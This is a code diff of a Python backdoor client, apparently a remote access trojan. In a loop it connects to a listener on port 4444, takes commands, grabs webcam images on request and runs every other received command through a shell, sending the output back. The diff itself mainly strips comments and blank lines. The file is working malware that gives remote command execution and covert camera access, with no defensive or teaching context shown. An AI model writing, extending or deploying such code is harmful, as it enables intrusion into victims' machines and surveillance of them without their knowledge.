@@ -4,19 +4,13 @@ import os
 import time
 import cv2
 
-
 while True:
     try:
         payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         payload.connect(("localhost", 4444))
-    # except TimeoutError:
-    #     continue
-    # except ConnectionResetError:
-    #     continue
     except:
         continue
     else:
-
         def recv_data():
             original_size = payload.recv(2048).decode("utf-8")
             original_size = int(original_size)
@@ -24,16 +18,14 @@ while True:
             while len(data) != original_size:
                 data = data + payload.recv(2048)
             return data
-
-
+            
         def send_data(output_data):
             size_of_data = len(output_data)
             size_of_data = str(size_of_data)
             payload.send(bytes(size_of_data, "utf-8"))
             time.sleep(2.0)
             payload.send(output_data)
-
-
+            
         while True:
             try:
                 cmd = payload.recv(2048)
@@ -73,9 +65,6 @@ while True:
                     else:
                         send_data(b"Camera Not Found..!!")
                     continue
-                    # with open('test1.png', 'wb') as w:
-                    #     w.write(image)
-                    #     w.close()
                 output = subprocess.check_output(cmd, shell=True)
                 send_data(output)
             except FileNotFoundError:
